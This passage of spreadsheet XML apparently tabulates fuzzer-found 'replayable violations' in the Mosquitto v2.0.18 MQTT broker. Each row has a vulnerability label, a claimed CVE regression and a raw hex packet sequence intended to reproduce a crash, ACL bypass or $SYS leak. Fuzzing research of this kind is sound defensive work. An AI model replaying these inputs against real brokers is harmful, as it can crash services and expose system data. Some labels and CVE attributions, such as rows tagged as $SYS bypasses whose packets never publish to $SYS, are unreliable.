        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 979B (报告+请求数据)\u000a请求数据: 142B\u000a\u000a---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MQTT请求序列(142B原始二进制) ---\u000aMsg[1]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10150000000000000000000000000000\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[3]: PUBLISH Topic='test/data' QoS=2 retain=False payload='\x00\x02h\x00\x00\x00\x00' | raw_header=34120009746573742f64617461000268\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=0000\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: TYPE0  | raw_header=0000\u000aMsg[8]: TYPE0  | raw_header=0030820b00010006746573742f50023e\u000aMsg[9]: (不完整,28B) raw=06746573742f230034120009746573742f6461746573742f23c00000\u000a(尾部28B): 06746573742f230034120009746573742f6461746573742f23c00000</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J3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8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90">
      <c r="A390" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B390" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C390" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(102B)\u000a4.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390" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0306 ===\u000a大小: 899B (报告+请求数据)\u000a请求数据: 102B\u000a\u000a---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MQTT请求序列(102B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v251 ClientID=''(128B) clean_session=True keepalive=0s Will=YES [自动清理会话] | raw_header=101500044d515454fb7f000000008066\u000aMsg[2]: UNSUBSCRIBE  | raw_header=a20b00010006746573742f2300\u000aMsg[3]: PUBLISH Topic='\x00\x03\x00\x12$SYS/' QoS=2 retain=False payload='broker/' | raw_header=3412000900030012245359532f62726f\u000aMsg[4]: (不完整,46B) raw=757074696d6502ffff400271dd20a2150005001173656e736f722f74656d702f726f6f6d612f662f\u000a(尾部46B): 757074696d6502ffff400271dd20a2150005001173656e736f722f74656d702f726f6f6d612f662f632f642f6509</f>
        <v/>
      </c>
      <c r="F3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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J39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91">
      <c r="A391" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0307</t>
        </is>
      </c>
      <c r="B391" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C391" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(31702B)\u000a4.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0x0307\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E391" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0307 ===\u000a大小: 5919B (报告+请求数据)\u000a请求数据: 31702B\u000a\u000a---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MQTT请求序列(31702B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=30209919999999999999999999641079\u000aMsg[2]: PUBACK PacketID=33268 | raw_header=4c7281f4000100ff246a6a6100303200\u000aMsg[3]: PUBREC PacketID=19275 | raw_header=514b4b4b4b4b4b4b4b4b4b4b4b4b4b4b\u000aMsg[4]: SUBSCRIBE PacketID=32 Topics=['$sha\x000///////\x02Ó¥åó'(QoS=0)] | raw_header=8224002000122473686100302f2f2f2f\u000aMsg[5]: PUBACK PacketID=14820 | raw_header=48960d39e4d8eb5e02000205ffff05a2\u000aMsg[6]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[7]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[8]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[9]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[10]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[11]: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raw_header=36363636363636363636363636363636\u000aMsg[16]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[17]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[18]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[19]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[20]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[21]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[22]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[23]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[24]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000aMsg[25]: PUBLISH Topic='?' QoS=3 retain=False payload='' | raw_header=36363636363636363636363636363636\u000a(尾部1060B): 3636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636363636</f>
        <v/>
      </c>
      <c r="F3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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J39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92">
      <c r="A392" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B392" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C392" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D3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392" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 783B (报告+请求数据)\u000a请求数据: 15B\u000a\u000a---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MQTT请求序列(15B原始二进制) ---\u000aMsg[1]: (不完整,15B) raw=153c000961666c6e65030f04515145\u000a(尾部15B): 153c000961666c6e65030f04515145</f>
        <v/>
      </c>
      <c r="F3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9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92" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J39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39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393">
      <c r="A393" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0386</t>
        </is>
      </c>
      <c r="B393" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C393" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(54B)\u000a4.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393" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0386 ===\u000a大小: 3568B (报告+请求数据)\u000a请求数据: 54B\u000a\u000a---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MQTT请求序列(54B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102200044d51545404c2003c00000009\u000aMsg[2]: PUBLISH Topic='$SYS/#' QoS=0 retain=True payload='' | raw_header=31080006245359532f23\u000aMsg[3]: PUBACK PacketID=5 | raw_header=40020005\u000aMsg[4]: PINGREQ  | raw_header=c000\u000aMsg[5]: CONNACK  | raw_header=2c00</f>
        <v/>
      </c>
      <c r="F3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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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94">
      <c r="A394" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:3,cat:0387</t>
        </is>
      </c>
      <c r="B394" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C394" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(443B)\u000a4.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0x0387\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E394" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0387 ===\u000a大小: 3978B (报告+请求数据)\u000a请求数据: 443B\u000a\u000a---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MQTT请求序列(443B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: AUTH  | raw_header=ffff0000ffffffff00000000000000e2\u000aMsg[3]: PUBACK PacketID=45944 | raw_header=4750b378be4a39dbf9cfffc1b9784dd5\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: CONNECT Proto= v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=13f5000000000000000000001b000018\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: TYPE0  | raw_header=0200\u000aMsg[8]: TYPE0  | raw_header=0000\u000aMsg[9]: TYPE0  | raw_header=0000\u000aMsg[10]: (不完整,99B) raw=f0ff000000e6000013f5000000000000000000001b0000180000640035000200ffed00ebfbe8ff00\u000a(尾部99B): f0ff000000e6000013f5000000000000000000001b0000180000640035000200ffed00ebfbe8ff00f6ff000000e7ff001000</f>
        <v/>
      </c>
      <c r="F3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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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95">
      <c r="A395" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B395" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C395" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(475B)\u000a4.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95" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 988B (报告+请求数据)\u000a请求数据: 475B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(475B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=3 Topics=[''(零长度!QoS=0), ''(零长度!QoS=2)] | raw_header=821700030000000000a2150005001173\u000aMsg[2]: PUBCOMP PacketID=4644 | raw_header=702f12245359532f62726f6b65722f75\u000aMsg[3]: PUBREL PacketID=28719 | raw_header=656d702f7865745f8330820b00010006\u000aMsg[4]: PUBREL PacketID=28722 | raw_header=677270322f73656e736f722f231e001d\u000aMsg[5]: PUBREL PacketID=26482 | raw_header=652f677270312f23260012686f6d652f\u000aMsg[6]: PUBCOMP PacketID=27697 | raw_header=76656c312f6c6576656c322f6c657665\u000aMsg[7]: TYPE0  | raw_header=0500\u000aMsg[8]: (不完整,20B) raw=1173656e736f722f74656d702f726f6f6d31c000\u000a(尾部20B): 1173656e736f722f74656d702f726f6f6d31c000</f>
        <v/>
      </c>
      <c r="F3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95" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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9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96">
      <c r="A396" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B396" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C396" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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96" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 822B (报告+请求数据)\u000a请求数据: 167B\u000a\u000a---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MQTT请求序列(167B原始二进制) ---\u000aMsg[1]: PUBCOMP  | raw_header=7200\u000aMsg[2]: SUBSCRIBE PacketID=494 Topics=[''(零长度!QoS=3)] | raw_header=823101ee00002b766572792f64656570\u000aMsg[3]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=82B | raw_header=30670013245359532f62726f6b65722f\u000aMsg[4]: (不完整,9B) raw=10e1e1e1e1e1d6e1e1\u000a(尾部9B): 10e1e1e1e1e1d6e1e1</f>
        <v/>
      </c>
      <c r="F3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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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397">
      <c r="A397" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:004a</t>
        </is>
      </c>
      <c r="B397" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C397" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D3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将种子文件(id:000009,sev:4,cat:004a)中的REQUEST DATA提取出来(121B)\u000a4.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0x004a\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E397" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:004a ===\u000a大小: 2977B (报告+请求数据)\u000a请求数据: 121B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b CVE=N/A)\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(121B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=70 Topics=['$share/grp2/sensor/#'(QoS=0), 'home/+/temperature'(QoS=2), ''(零长度!QoS=0)] | raw_header=8231004600142473686172652f677270\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload='\x00GE \x18NÜ`\x19óc\x1a¥"\x9d}\x08V¶ä' | raw_header=34290013245359532f62726f6b65722f\u000aMsg[3]: (不完整,27B) raw=307852657461696e6573742f646174610002756520006650020002\u000a(尾部27B): 307852657461696e6573742f646174610002756520006650020002</f>
        <v/>
      </c>
      <c r="F3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9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97" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J39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39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398">
      <c r="A398" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B398" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C398" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(165B)\u000a4.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98" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 865B (报告+请求数据)\u000a请求数据: 165B\u000a\u000a---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MQTT请求序列(165B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=97 Topics=[''(零长度!QoS=1)] | raw_header=823d0061000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='test/topic' QoS=0 retain=True payload_len=82B | raw_header=395e000a746573742f746f7069634301\u000aMsg[3]: (不完整,6B) raw=058553bb0db4\u000a(尾部6B): 058553bb0db4</f>
        <v/>
      </c>
      <c r="F3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98" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J3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39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99">
      <c r="A399" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B399" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C399" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D3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DATA提取出来(184B)\u000a4.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99" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 894B (报告+请求数据)\u000a请求数据: 184B\u000a\u000a---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MQTT请求序列(184B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=28 Topics=[''(零长度!QoS=3)] | raw_header=824f001c00000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=True payload_len=79B | raw_header=31640013245359532f62726f6b65722f\u000aMsg[3]: PUBLISH  | raw_header=33</f>
        <v/>
      </c>
      <c r="F3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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J3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39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00">
      <c r="A400" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:00ca</t>
        </is>
      </c>
      <c r="B400" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C400" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D4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将种子文件(id:000009,sev:4,cat:00ca)中的REQUEST DATA提取出来(55B)\u000a4.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0x00ca\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E400" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00ca ===\u000a大小: 3097B (报告+请求数据)\u000a请求数据: 55B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: $SYS wildcard subscription returned system data (Cat=0x000a Hash=0x3cfdd80b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MQTT请求序列(55B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=4980 Topics=[''(零长度!QoS=2)] | raw_header=82051374000002\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload='\x13u¶²Ðþ\x02\x05w½¸5do' | raw_header=352d001d245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE  | raw_header=84</f>
        <v/>
      </c>
      <c r="F4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0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00" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J40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40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401">
      <c r="A401" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B401" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C401" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(351B)\u000a4.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01" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0140 ===\u000a大小: 894B (报告+请求数据)\u000a请求数据: 351B\u000a\u000a---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MQTT请求序列(351B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=0s [自动清理会话] | raw_header=101500044d5154540473000000008066\u000aMsg[2]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=820b0000000000000000000000\u000aMsg[3]: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PINGRESP  | raw_header=dd00\u000aMsg[18]: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raw_header=0000\u000a(尾部269B): 000000000000000000000000000000010006746573742f23003412000974657b742f643d7461656c6c6f8251009900126800</f>
        <v/>
      </c>
      <c r="F4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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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0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02">
      <c r="A402" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B402" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C402" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(273B)\u000a4.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402" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0141 ===\u000a大小: 998B (报告+请求数据)\u000a请求数据: 273B\u000a\u000a---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MQTT请求序列(273B原始二进制) ---\u000aMsg[1]: SUBACK  | raw_header=9e00\u000aMsg[2]: TYPE0  | raw_header=0400\u000aMsg[3]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0), ''(零长度!QoS=0)] | raw_header=80220000000000000000000000000000\u000aMsg[4]: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AUTH  | raw_header=fcff0000000000000000000004000000\u000aMsg[22]: CONNACK  | raw_header=2600\u000aMsg[23]: TYPE0  | raw_header=0000\u000aMsg[24]: (不完整,65B) raw=0b73656e736f722f74656d702e4dc8dbb749510e628c15797fb90000000000000000000000fffa00\u000a(尾部65B): 0b73656e736f722f74656d702e4dc8dbb749510e628c15797fb90000000000000000000000fffa0000000000000000000000</f>
        <v/>
      </c>
      <c r="F4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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J40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0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03">
      <c r="A403" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B403" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C403" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(89B)\u000a4.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403" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0143 ===\u000a大小: 959B (报告+请求数据)\u000a请求数据: 89B\u000a\u000a---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MQTT请求序列(89B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=300 Topics=['$share/g3/home/+/temperature'(QoS=0), 'test/topic'(QoS=0), ''(零长度!QoS=0)] | raw_header=8231012c001c2473686172652f67332f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload='\x01-\u00ad\x82F]\x1cl\x91\u000d' | raw_header=3c1f0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,5B) raw=4bfbff7601\u000a(尾部5B): 4bfbff7601</f>
        <v/>
      </c>
      <c r="F4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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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0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04">
      <c r="A404" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B404" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C404" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(111B)\u000a4.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404" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c1 ===\u000a大小: 1023B (报告+请求数据)\u000a请求数据: 111B\u000a\u000a---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MQTT请求序列(111B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=870 Topics=[''(零长度!QoS=1)] | raw_header=820f0366000009612f622f632f642f65\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload_len=68B | raw_header=355b00152473686172652f6772702f74\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F4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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J4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0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05">
      <c r="A405" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B405" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C405" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(253B)\u000a4.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405" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:01c3 ===\u000a大小: 1311B (报告+请求数据)\u000a请求数据: 253B\u000a\u000a---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MQTT请求序列(253B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=198 Topics=[''(零长度!QoS=2)] | raw_header=824700c6000012686f6d652f2b2f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=130B | raw_header=3da101001d245359532f62726f6b6572\u000aMsg[3]: (不完整,16B) raw=4bfb124bfb12143c00ff60636c6e6330\u000a(尾部16B): 4bfb124bfb12143c00ff60636c6e6330</f>
        <v/>
      </c>
      <c r="F4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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J4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0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06">
      <c r="A406" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_6.tar.gz/replayable-violations/id:000009,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B406" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C406" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D4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DATA提取出来(178B)\u000a4.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406" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 1017B (报告+请求数据)\u000a请求数据: 178B\u000a\u000a---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MQTT请求序列(178B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(25600B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003c64006166\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b00010000000064742f2300\u000aMsg[3]: PUBLISH Topic='test/data' QoS=2 retain=False payload='/e\x01=\x1e\x00\u0009' | raw_header=34120009746573742f646174612f6501\u000aMsg[4]: PUBREL PacketID=25135 | raw_header=612f622f632f642f650cbc93db4fc0b2\u000aMsg[5]: PUBCOMP PacketID=20844 | raw_header=711f516c39856436fcdcafa0d2a9e706\u000aMsg[6]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=122473686172652f677270312f746573\u000aMsg[7]: CONNECT  | raw_header=1900</f>
        <v/>
      </c>
      <c r="F4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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
